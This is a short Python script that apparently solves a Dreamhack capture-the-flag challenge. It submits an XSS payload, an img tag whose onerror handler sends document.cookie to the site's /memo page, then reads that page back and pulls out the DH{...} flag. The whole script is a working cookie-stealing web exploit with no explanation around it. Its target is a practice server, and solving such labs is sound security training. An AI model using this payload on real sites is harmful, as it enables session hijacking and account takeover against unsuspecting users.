import requests
import re

HOST = "http://host1.dreamhack.games"
PORT = 12345

res = requests.post(
    f"{HOST}:{PORT}/flag",
    data={
        "param": '<img src="#" onerror="location.href = \'/memo?memo=\'+document.cookie">'
    },
)
res = requests.get(f"{HOST}:{PORT}/memo")
flag = re.search(r"DH{.*}", res.text).group()
print(flag)
